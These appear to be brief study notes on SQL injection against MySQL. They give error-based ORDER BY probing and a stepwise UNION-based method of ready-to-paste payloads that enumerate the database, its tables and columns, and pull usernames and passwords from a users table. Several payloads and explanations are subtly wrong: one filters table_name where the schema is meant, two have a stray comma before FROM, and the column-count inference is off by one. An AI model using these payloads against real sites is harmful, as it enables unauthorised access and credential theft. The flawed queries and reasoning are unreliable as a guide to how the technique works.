SQL Injection

1. Error Based SQLi

  • Method to know the structure of database via ERROR.

ORDER BY n

  • ex : ' ORDER BY 5 -- -
  • [Unknown column '5' in order clause] => We can deduce there are less than 4 column.

2. UNION-Based SQLi

Step 1 : Extract the number of columns.

ORDER BY n -- -

or

' UNION SELECT NULL, NULL, NULL, NULL -- -

Step 2 : Check the place where the data displayed

' UNION SELECT 1,2,3,4 -- -

  • ex : [2], [3] are displayed => We can embed db-information there.

Step 3 : Extract Database Information

Name of the database

' UNION SELECT NULL, database(), user(), version() -- -

  • database() returns the name of database
  • user() returns the user you're seeing now
  • version() returns the version of Mysqli

Name of the table

' UNION SELECT NULL, table_name, NULL, NULL FROM information_schema.tables WHERE table_name = database() -- -

  • table_name < information_schema.tables < database()

Name of the column

' UNION SELECT NULL, column_name, NULL, NULL, FROM information_schema.columns WHERE table_name = 'users' -- -

  • column_name < information_schema.columns < 'users'

Extract Data

' UNION SELECT NULL, username, password, NULL, FROM users -- -

  • username and password are the data we got in column_name
